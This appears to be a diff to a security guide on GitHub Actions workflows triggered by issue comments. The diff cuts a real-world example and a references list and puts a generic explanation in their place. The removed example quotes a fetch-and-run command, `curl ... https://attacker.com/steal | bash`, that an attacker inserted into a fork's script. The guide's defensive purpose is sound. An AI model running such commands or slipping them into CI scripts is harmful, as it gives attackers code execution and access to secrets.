@@ -48,7 +48,9 @@ jobs:
       - run: ./version.sh -u -n
 ```
 
-**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `author_association` check existed.
+Without an `author_association` check, a fork PR can modify a script that the
+comment command later executes. The command body becomes the trigger, while the
+modified script supplies the payload.
 
 ### Compound: Command + Expression Injection
 
@@ -184,10 +186,3 @@ TRIGGER: issue_comment workflow at [file:line], condition at line [N]
 EXECUTION: [What runs — script execution, fork checkout, etc.]
 IMPACT: [RCE, deployment trigger, secret access, etc.]
 ```
-
----
-
-## References
-
-- [GitHub Docs: Events that trigger workflows — issue_comment](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#issue_comment)
-- [HackerBot Claw — project-akri /version command exploit](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
